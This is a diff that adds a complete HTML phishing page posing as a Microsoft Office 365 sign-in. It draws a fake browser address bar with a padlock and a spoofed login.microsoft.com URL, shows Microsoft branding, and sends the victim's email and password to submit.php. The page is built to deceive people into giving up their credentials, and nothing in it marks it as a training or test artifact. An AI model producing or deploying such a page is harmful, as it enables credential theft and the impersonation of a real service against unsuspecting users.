@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        html, body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f3f2f1;
+            color: #000000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .fake-url-bar {
+            width: 100%;
+            background-color: #ffffff;
+            border-bottom: 1px solid #cccccc;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+        }
+        .lock-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 10px;
+        }
+        .url-text {
+            font-size: 14px;
+            color: #555555;
+        }
+        .content {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 60px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+            border-radius: 8px;
+        }
+        .login-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .login-header img {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+        .login-header h1 {
+            font-size: 24px;
+            color: #333333;
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        .login-form label {
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #333333;
+        }
+        .login-form input {
+            font-size: 16px;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+        }
+        .login-form button {
+            font-size: 16px;
+            padding: 10px;
+            background-color: #0078d4;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-form button:hover {
+            background-color: #005a9e;
+        }
+    </style>
+</head>
+<body>
+    <div class="fake-url-bar">
+        <div class="lock-icon">
+            <svg width="16px" height="16px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M7 10.0288C7.47142 10 8.05259 10 8.8 10H15.2C15.9474 10 16.5286 10 17 10.0288M7 10.0288C6.41168 10.0647 5.99429 10.1455 5.63803 10.327C5.07354 10.6146 4.6146 11.0735 4.32698 11.638C4 12.2798 4 13.1198 4 14.8V16.2C4 17.8802 4 18.7202 4.32698 19.362C4.6146 19.9265 5.07354 20.3854 5.63803 20.673C6.27976 21 7.11984 21 8.8 21H15.2C16.8802 21 17.7202 21 18.362 20.673C18.9265 20.3854 19.3854 19.9265 19.673 19.362C20 18.7202 20 17.8802 20 16.2V14.8C20 13.1198 20 12.2798 19.673 11.638C19.3854 11.0735 18.9265 10.6146 18.362 10.327C18.0057 10.1455 17.5883 10.0647 17 10.0288M7 10.0288V8C7 5.23858 9.23858 3 12 3C14.7614 3 17 5.23858 17 8V10.0288" stroke="#A6A6B2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </div>
+        <div class="url-text">https://login.microsoft.com/auth/ms/o365</div>
+    </div>
+    <div class="content">
+        <div class="login-header">
+            <img src="microsoft-logo.svg" alt="Microsoft Logo">
+            <h1>Sign in</h1>
+        </div>
+        <form class="login-form" action="submit.php" method="POST">
+            <label for="email">Email, phone, or Skype</label>
+            <input type="text" id="email" name="email" autofill="off" autocomplete="off" required>
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
